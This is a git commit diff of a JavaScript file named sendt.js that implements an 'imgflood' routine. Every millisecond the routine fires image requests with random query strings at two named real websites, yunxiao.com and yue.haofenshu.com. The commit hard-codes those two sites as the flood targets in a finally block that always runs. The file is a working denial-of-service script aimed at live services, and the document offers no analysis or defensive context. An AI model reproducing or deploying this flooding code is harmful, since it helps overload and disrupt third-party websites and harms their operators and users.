b2fdae77e441e412b56cc0e4d8cb47063816761a
Oc-found <153354935+OcFounder@users.noreply.github.com>
2024-07-04 17:47:18 +0800

    4

--- sendt.js
+++ sendt.js
@@ -2,13 +2,15 @@ function imgflood() {
   try {
     var TARGET = document.getElementById('sss').value;
   }catch {
-  var pic = new Image();
-  var ran = Math.floor(Math.random() * 1000);
-  pic.src = TARGET+'?val='+ran;
-}finally {
-  pic.src = 'https://www.yunxiao.com?val='+ran;
-  pic.src = 'https://yue.haofenshu.com?val='+ran;
-}
+    var pic = new Image();
+    var ran = Math.floor(Math.random() * 1000);
+    //pic.src = TARGET+'?val='+ran;
+  }finally {
+    var pic = new Image();
+    var ran = Math.floor(Math.random() * 1000);
+    pic.src = 'https://www.yunxiao.com?val='+ran;
+    pic.src = 'https://yue.haofenshu.com?val='+ran;
+  }
 }
   setInterval(imgflood, 1);
 
